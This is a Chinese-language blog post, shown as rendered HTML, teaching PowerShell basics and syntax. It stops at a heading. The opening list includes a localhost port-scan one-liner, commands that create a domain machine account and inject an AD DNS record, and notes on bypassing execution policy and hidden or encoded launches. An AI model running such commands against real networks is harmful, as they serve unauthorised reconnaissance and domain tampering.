@@ -1,0 +1,684 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/b6.png">
+  <link rel="icon" type="image/png" href="/img/b6.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>powershell的应用 - Gr3yy&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"gr3yyy123.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Gr3yy's B1og</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="powershell的应用">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-02-03 05:00" pubdate>
+        February 3, 2021 am
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      43
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">powershell的应用</h1>
+            
+            <div class="markdown-body">
+              <h1 id="powershell-应用"><a href="#powershell-应用" class="headerlink" title="powershell 应用"></a>powershell 应用</h1><ul>
+<li>执行powershell脚本需要先：  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-ExecutionPolicy</span> RemoteSigned<br></code></pre></td></tr></table></figure>
+  <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">cmd</span><span class="bash"> /c powershell <span class="hljs-string">&quot;Set-ExecutionPolicy RemoteSigned&quot;</span></span><br></code></pre></td></tr></table></figure></li>
+<li>写入到文件：  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">write-output</span> <span class="hljs-string">&quot;xxx&quot;</span> &gt;&gt; <span class="hljs-string">&quot;C:\Users\Simba\Desktop\test5.txt&quot;</span><br></code></pre></td></tr></table></figure></li>
+<li>代替wmic:  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-WmiObject</span> <span class="hljs-literal">-class</span> win32_product | <span class="hljs-built_in">Select-Object</span> <span class="hljs-literal">-property</span> name,version<br></code></pre></td></tr></table></figure></li>
+<li>端口扫描：  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-number">134</span>..<span class="hljs-number">136</span> | % &#123;<span class="hljs-built_in">write-output</span> ((<span class="hljs-built_in">new-object</span> Net.Sockets.TcpClient).Connect(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-variable">$_</span>)) <span class="hljs-string">&quot;Port <span class="hljs-variable">$_</span> is open!&quot;</span> &gt;&gt; <span class="hljs-string">&quot;C:\Users\Simba\Desktop\test5.txt&quot;</span>&#125; <span class="hljs-number">2</span>&gt;<span class="hljs-variable">$null</span><br></code></pre></td></tr></table></figure></li>
+<li>域内创建机器用户：  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">New-MachineAccount</span> <span class="hljs-literal">-MachineAccount</span> testNew <span class="hljs-literal">-Password</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&quot;123456789&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>)<br></code></pre></td></tr></table></figure></li>
+<li>域内创建dns记录：  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-DNSUpdate</span> <span class="hljs-literal">-DNSType</span> A <span class="hljs-literal">-DNSName</span> testNew <span class="hljs-literal">-DNSData</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.111</span><br></code></pre></td></tr></table></figure>
+</li>
+</ul>
+<hr>
+<h2 id="好了以下是正经学习"><a href="#好了以下是正经学习" class="headerlink" title="好了以下是正经学习"></a>好了以下是正经学习</h2><ul>
+<li><p>cmdlet</p>
+<p>  ps创建的新的命令模式，调用为 动词+名词 的格式，比如：<code>Get-Command</code> , <code>Get-Help</code>。</p>
+<p>  <code>Get-Command -Name</code> 查看所有命令</p>
+<p>  <code>Get-Help</code> 查看命令帮助</p>
+</li>
+<li><p><code>$?</code> 获取命令执行是否成功</p>
+</li>
+<li><p>用 <code>&#123;&#125;</code> 包裹可执行的powershell脚本快,也可以用 <code>$scriptblock = [ScriptBlock]::Create(&#39;xxx&#39;)</code> 动态创建。</p>
+</li>
+<li><p>别名</p>
+<p>  内置命令一般拥有别名，可以使用Get-Help查看</p>
+</li>
+<li><p>重定向输出</p>
+<p>  可以使用 <code>Out-File</code> 或者 <code>&gt;</code></p>
+</li>
+<li><p>运算符（比较，通配，包含替换，分割连接）</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-operator">-gt</span>     大于<br><span class="hljs-operator">-ge</span>     大于等于<br><span class="hljs-operator">-lt</span>     小于<br><span class="hljs-operator">-le</span>     小于等于<br><span class="hljs-operator">-eq</span>     等于<br><span class="hljs-operator">-ne</span>     不等于<br></code></pre></td></tr></table></figure>
+<p>  <code>-like</code> 和 <code>-nolike</code> 用于通配符（<code>?</code>、<code>*</code>）</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> D:\Desktop&gt; <span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-string">&#x27;zhang3&#x27;</span> <span class="hljs-operator">-contains</span> <span class="hljs-string">&#x27;zhang3&#x27;</span><br>True<br><br><span class="hljs-built_in">PS</span> D:\Desktop&gt; <span class="hljs-string">&#x27;hello zhang3&#x27;</span> <span class="hljs-operator">-replace</span> <span class="hljs-string">&#x27;zhang3&#x27;</span>,<span class="hljs-string">&#x27;yitian&#x27;</span><br>hello yitian<br></code></pre></td></tr></table></figure>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> D:\Desktop&gt; <span class="hljs-string">&#x27;A B C DE&#x27;</span> <span class="hljs-operator">-split</span> <span class="hljs-string">&#x27; &#x27;</span><br>A<br>B<br>C<br>DE<br><span class="hljs-built_in">PS</span> D:\Desktop&gt; <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span> <span class="hljs-operator">-join</span> <span class="hljs-string">&#x27;,&#x27;</span><br>A,B,C<br></code></pre></td></tr></table></figure></li>
+<li><p>逻辑</p>
+  <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-and    与</span><br><span class="hljs-deletion">-or     或</span><br><span class="hljs-deletion">-xor    异或</span><br><span class="hljs-addition">!/-not  非</span><br></code></pre></td></tr></table></figure></li>
+<li><p><code>-f</code> 格式化字符串，等于python的 <code>format</code></p>
+</li>
+<li><p>判断</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$condition</span> = <span class="hljs-variable">$true</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$condition</span> <span class="hljs-operator">-eq</span> <span class="hljs-variable">$true</span>) &#123;<br>    <span class="hljs-built_in">Write-Output</span> <span class="hljs-string">&quot;condition is <span class="hljs-variable">$true</span>&quot;</span><br>&#125;<br><span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$condition</span> <span class="hljs-operator">-ne</span> <span class="hljs-variable">$true</span> ) &#123;<br>    <span class="hljs-built_in">Write-Output</span> <span class="hljs-string">&quot;condition is <span class="hljs-variable">$false</span>&quot;</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">Write-Output</span> <span class="hljs-string">&quot;other ocndition&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure></li>
+<li><p>循环</p>
+<p>  do:</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$i</span> = <span class="hljs-number">0</span><br><span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-variable">$i</span>++<br>    <span class="hljs-built_in">Write-Output</span> <span class="hljs-variable">$i</span><br>&#125;<span class="hljs-keyword">while</span> (<span class="hljs-variable">$i</span> <span class="hljs-operator">-ne</span> <span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure>
+<p>  while:</p>
+  <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$i</span> = 0</span><br><span class="hljs-keyword">while</span> (<span class="hljs-symbol">$</span>i -<span class="hljs-keyword">lt</span> <span class="hljs-number">3</span>) &#123;<br>    Write-Output <span class="hljs-symbol">$</span>i<br>    <span class="hljs-symbol">$</span>i++<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>  for:</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> <span class="hljs-operator">-ne</span> <span class="hljs-number">3</span>; <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-built_in">Write-Output</span> <span class="hljs-variable">$i</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>  foreach:</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$array</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>)<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$i</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$array</span>) &#123;<br>    <span class="hljs-built_in">Write-Output</span> <span class="hljs-variable">$i</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>  另一种用法：</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">&lt;command&gt; | <span class="hljs-keyword">foreach</span> &#123;&lt;beginning command_block&gt;&#125;&#123;&lt;middle command_block&gt;&#125;&#123;&lt;ending command_block&gt;&#125;<br></code></pre></td></tr></table></figure>
+<p>  使用这种方法时，for-each后面可以跟三个语句块，第一个语句块是开始语句块，在循环前执行一次，常用来初始化一些数据；第三个是结束语句块，在循环结束之后执行一次，常用于统计一些循环数据；第二个就是正常的循环语句块，会循环多次。</p>
+<p>  foreach-object:</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 获取所有的服务，并获取对呀进程ID是否大于100</span><br><span class="hljs-built_in">Get-WmiObject</span> Win32_Service | <span class="hljs-built_in">ForEach-Object</span> &#123;<span class="hljs-string">&quot;Name:&quot;</span>+ <span class="hljs-variable">$_</span>.DisplayName, <span class="hljs-string">&quot;, Is ProcessId more than 100:&quot;</span> + (<span class="hljs-variable">$_</span>.ProcessId <span class="hljs-operator">-gt</span> <span class="hljs-number">100</span>)&#125;<br></code></pre></td></tr></table></figure></li>
+<li><p>函数</p>
+<p>  声明：</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Say-Hello</span> <span class="hljs-params">([string] <span class="hljs-variable">$name</span>)</span></span> &#123;<br>    <span class="hljs-built_in">Write-Output</span> <span class="hljs-string">&quot;Hello, <span class="hljs-variable">$name</span>&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>  调用：</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">Say<span class="hljs-literal">-Hello</span> <span class="hljs-literal">-name</span> <span class="hljs-string">&#x27;yitian&#x27;</span><br></code></pre></td></tr></table></figure></li>
+<li><p>异常处理</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-keyword">Try</span>&#123;<br>    <span class="hljs-variable">$connection</span>.open()<br>    <span class="hljs-variable">$success</span> = <span class="hljs-variable">$true</span><br>&#125;<span class="hljs-keyword">Catch</span>&#123;<br>    <span class="hljs-variable">$success</span> = <span class="hljs-variable">$false</span><br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>数组</p>
+<p>  数组创建:</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$array</span> = <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span><br><span class="hljs-variable">$array</span> = <span class="hljs-number">1</span>..<span class="hljs-number">4</span><br><span class="hljs-variable">$array</span>=<span class="hljs-number">1</span>,<span class="hljs-string">&quot;2017&quot;</span>,([<span class="hljs-type">System.Guid</span>]::NewGuid()),(<span class="hljs-built_in">get-date</span>)<br><span class="hljs-variable">$a</span>=<span class="hljs-selector-tag">@</span>()  <span class="hljs-comment"># 空数组</span><br><span class="hljs-variable">$a</span>=,<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-comment"># 一个元素的数组</span><br></code></pre></td></tr></table></figure>
+<p>  数组访问：</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$ip</span> = ipconfig<br><span class="hljs-variable">$ip</span>[<span class="hljs-number">1</span>] <span class="hljs-comment"># 获取ipconfig第二行的数据</span><br></code></pre></td></tr></table></figure></li>
+<li><p>哈希表</p>
+<p>  哈希表创建：</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$stu</span>=<span class="hljs-selector-tag">@</span>&#123; Name = <span class="hljs-string">&quot;test&quot;</span>;Age=<span class="hljs-string">&quot;12&quot;</span>;sex=<span class="hljs-string">&quot;man&quot;</span> &#125;<br></code></pre></td></tr></table></figure>
+<ul>
+<li><p>哈希表里可以存数组</p>
+<p>哈希表的加入与删除：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$Student</span>=<span class="hljs-selector-tag">@</span>&#123;&#125;<br><span class="hljs-variable">$Student</span>.Name=<span class="hljs-string">&quot;hahaha&quot;</span><br><span class="hljs-variable">$stu</span>.Remove(<span class="hljs-string">&quot;Name&quot;</span>)<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>对象</p>
+<p>  创建对象：</p>
+<ul>
+<li><p>使用 <code>New-object</code> 创建对象</p>
+<p>增加属性：</p>
+</li>
+<li><p>使用 <code>Add-Member</code> 增加属性和方法</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:Powershell&gt; <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$pocketknife</span> <span class="hljs-literal">-Name</span> Color <span class="hljs-literal">-Value</span> <span class="hljs-string">&quot;Red&quot;</span> <span class="hljs-literal">-MemberType</span> NoteProperty<br><span class="hljs-built_in">PS</span> C:Powershell&gt; <span class="hljs-variable">$pocketknife</span><br><br>Color<br>-----<br>Red<br><br><span class="hljs-built_in">PS</span> C:Powershell&gt; <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$pocketknife</span> <span class="hljs-literal">-Name</span> Weight <span class="hljs-literal">-Value</span> <span class="hljs-string">&quot;55&quot;</span><br><span class="hljs-literal">-MemberType</span> NoteProperty<br><span class="hljs-built_in">PS</span> C:Powershell&gt; <span class="hljs-variable">$pocketknife</span> | <span class="hljs-built_in">Add-Member</span> NoteProperty Blades <span class="hljs-number">3</span><br><span class="hljs-built_in">PS</span> C:Powershell&gt; <span class="hljs-variable">$pocketknife</span> | <span class="hljs-built_in">Add-Member</span> NoteProperty Manufacturer ABC<br><span class="hljs-built_in">PS</span> C:Powershell&gt; <span class="hljs-variable">$pocketknife</span><br><br>Color Weight Blades Manufacturer<br>----- ------ ------ ------------<br>Red   <span class="hljs-number">55</span>          <span class="hljs-number">3</span> ABC<br></code></pre></td></tr></table></figure>
+<p>增加方法：</p>
+<p>将 <code>Add-Member</code> 中的 <code>NoteProperty</code> 改成 <code>ScriptMethod</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 增加一个新方法:</span><br><span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-memberType</span> ScriptMethod <span class="hljs-operator">-In</span> <span class="hljs-variable">$pocketknife</span> `<br><span class="hljs-literal">-name</span> cut <span class="hljs-literal">-Value</span> &#123; <span class="hljs-string">&quot;I&#x27;m whittling now&quot;</span> &#125;<br><span class="hljs-comment"># 指定参数类型增加一个新方法:</span><br><span class="hljs-built_in">Add-Member</span> <span class="hljs-operator">-in</span> <span class="hljs-variable">$pocketknife</span> ScriptMethod screw &#123; <span class="hljs-string">&quot;Phew...it&#x27;s in!&quot;</span> &#125;<br><span class="hljs-comment">#直接通过管道增加一个新方法:</span><br><span class="hljs-variable">$pocketknife</span> | <span class="hljs-built_in">Add-Member</span> ScriptMethod corkscrew &#123; <span class="hljs-string">&quot;Pop! Cheers!&quot;</span> &#125;<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>执行脚本里的函数</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .script.ps1<br></code></pre></td></tr></table></figure></li>
+<li><p>cmd调用powershell</p>
+  <figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs inform7">PowerShell<span class="hljs-comment">[.exe]</span><br>    <span class="hljs-comment">[-PSConsoleFile &lt;file&gt; | -Version &lt;version&gt;]</span><br>    <span class="hljs-comment">[-EncodedCommand &lt;Base64EncodedCommand&gt;]</span><br>    <span class="hljs-comment">[-ExecutionPolicy &lt;ExecutionPolicy&gt;]</span><br>    <span class="hljs-comment">[-File &lt;filePath&gt; &lt;args&gt;]</span><br>    <span class="hljs-comment">[-InputFormat &#123;Text | XML&#125;]</span> <br>    <span class="hljs-comment">[-NoExit]</span><br>    <span class="hljs-comment">[-NoLogo]</span><br>    <span class="hljs-comment">[-NonInteractive]</span> <br>    <span class="hljs-comment">[-NoProfile]</span> <br>    <span class="hljs-comment">[-OutputFormat &#123;Text | XML&#125;]</span> <br>    <span class="hljs-comment">[-Sta]</span><br>    <span class="hljs-comment">[-WindowStyle &lt;style&gt;]</span><br>    <span class="hljs-comment">[-Command &#123; - | &lt;script-block&gt; <span class="hljs-comment">[-args &lt;arg-array&gt;]</span></span><br><span class="hljs-comment">                    | &lt;string&gt; <span class="hljs-comment">[&lt;CommandParameters&gt;]</span> &#125; ]</span><br></code></pre></td></tr></table></figure>
+<p>名称 |    解释</p>
+</li>
+</ul>
+<p>—|—<br>-Command |    需要执行的代码<br>-ExecutionPolicy |    设置默认的执行策略，一般使用Bypass<br>-EncodedCommand    | 执行Base64代码<br>-File | 这是需要执行的脚本名<br>-NoExit|执行完成命令之后不会立即退出，比如我们执行powerhsell whoami 执行完成之后会推出我们的PS会话，如果我们加上这个参数，运行完之后还是会继续停留在PS的界面<br>-NoLogo | 不输出PS的Banner信息<br>-Noninteractive | 不开启交互式的会话<br>-NoProfile | 不使用当前用户使用的配置文件<br>-Sta | 以单线程模式启动ps<br>-Version | 设置用什么版本去执行代码<br>-WindowStyle | 设置Powershell的执行窗口，有下面的参数Normal, Minimized, Maximized, or Hidden</p>
+<hr>
+<h2 id="powershell执行策略"><a href="#powershell执行策略" class="headerlink" title="powershell执行策略"></a>powershell执行策略</h2><table>
+<thead>
+<tr>
+<th>名称</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Restricted</td>
+<td>受限制的，可以执行单个的命令，但是不能执行脚本Windows 8, Windows Server 2012, and Windows 8.1中默认就是这种策略，所以是不能执行脚本的，执行就会报错，那么如何才能执行呢？Set-ExecutionPolicy -ExecutionPolicy Bypass就是设置策略为Bypass这样就可以执行脚本了。</td>
+</tr>
+<tr>
+<td>AllSigned</td>
+<td>AllSigned 执行策略允许执行所有具有数字签名的脚本</td>
+</tr>
+<tr>
+<td>RemoteSigned</td>
+<td>当执行从网络上下载的脚本时，需要脚本具有数字签名，否则不会运行这个脚本。如果是在本地创建的脚本则可以直接执行，不要求脚本具有数字签名。</td>
+</tr>
+<tr>
+<td>Unrestricted</td>
+<td>这是一种比较宽容的策略，允许运行未签名的脚本。对于从网络上下载的脚本，在运行前会进行安全性提示。需要你确认是否执行脚本</td>
+</tr>
+<tr>
+<td>Bypass</td>
+<td>Bypass 执行策略对脚本的执行不设任何的限制，任何脚本都可以执行，并且不会有安全性提示。</td>
+</tr>
+<tr>
+<td>Undefined</td>
+<td>Undefined 表示没有设置脚本策略。当然此时会发生继承或应用默认的脚本策略。</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="一些应用"><a href="#一些应用" class="headerlink" title="一些应用"></a>一些应用</h2><ul>
+<li><p>获取文件信息：</p>
